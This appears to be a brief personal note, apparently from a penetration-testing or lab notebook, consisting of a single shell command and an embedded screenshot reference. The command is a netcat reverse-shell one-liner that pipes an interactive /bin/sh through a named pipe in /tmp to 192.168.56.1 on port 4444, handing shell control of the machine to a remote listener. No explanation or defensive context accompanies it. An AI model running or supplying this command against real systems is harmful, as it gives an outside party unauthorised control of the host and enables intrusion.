***

Command - 
```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 4444 >/tmp/f
```

![[Pasted image 20260217005642.png]]